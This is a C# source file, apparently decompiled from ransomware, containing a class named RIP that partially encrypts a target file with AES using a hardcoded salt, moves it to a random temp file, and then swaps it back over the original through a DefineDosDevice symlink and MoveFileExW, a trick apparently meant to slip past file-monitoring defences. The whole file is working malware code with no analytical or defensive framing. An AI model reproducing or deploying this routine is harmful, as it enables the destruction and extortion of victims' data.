using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Complex;

public class RIP
{
	[DllImport("kernel32.dll")]
	private static extern bool DefineDosDevice(uint dwFlags, string lpDeviceName, string lpTargetPath);

	public static void Cleanup(string fileToDelete = null)
	{
		try
		{
			DefineDosDevice(3u, "Resolve", string.Empty);
		}
		catch
		{
		}
	}

	private static bool PrepareToRipIt(string targetFilePath, out string encryptedFilePath)
	{
		byte[] clear = Encryptions.ReadFromFile(targetFilePath, Convert.ToInt32(Program.PartialSize) * 1024 * 1024);
		byte[] encrypted = Encryptions.AESEncryptBytes(clear, Encoding.ASCII.GetBytes(Program.DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		encryptedFilePath = string.Empty;
		string empty = string.Empty;
		try
		{
			empty = Path.GetTempPath() + "\\";
		}
		catch
		{
			return false;
		}
		string text;
		do
		{
			text = Guid.NewGuid().ToString();
		}
		while (File.Exists(empty + text));
		encryptedFilePath = empty + text;
		try
		{
			File.Move(targetFilePath, encryptedFilePath);
			Encryptions.WriteToFile(encryptedFilePath, encrypted);
		}
		catch
		{
			return false;
		}
		return true;
	}

	private static bool RipIt(string sourceFilePath, string destinationFilePath)
	{
		try
		{
			if (!DefineDosDevice(1u, "Resolve", "\\??\\" + destinationFilePath))
			{
				return false;
			}
			if (!Program.MoveFileExW(sourceFilePath, "\\\\.\\Resolve", 9u))
			{
				return false;
			}
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static bool Start(string targetFilePath)
	{
		string encryptedFilePath = "";
		Cleanup();
		if (!PrepareToRipIt(targetFilePath, out encryptedFilePath))
		{
			Cleanup(encryptedFilePath);
			return false;
		}
		if (!RipIt(encryptedFilePath, targetFilePath))
		{
			Cleanup(encryptedFilePath);
			return false;
		}
		Cleanup();
		return true;
	}
}
